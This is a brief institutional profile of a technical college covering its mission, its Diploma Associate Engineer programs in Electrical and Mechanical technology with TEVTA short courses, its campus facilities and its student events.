About College

Mission:
To prepare students for success by equipping them with technical expertise, critical thinking skills, and a commitment to excellence and innovation.
Programs:
Offers Diploma Associate Engineer (DAE) in technologies such as Electrical and Mechanical. Collaborates with TEVTA to provide short-term, government-certified technical courses focused on job market needs.
Facilities:
Includes advanced computer labs, an extensive library, a campus canteen, sports grounds, and a mosque.
Student life:
The college fosters a community through events like freshers' parties and athletic meets.
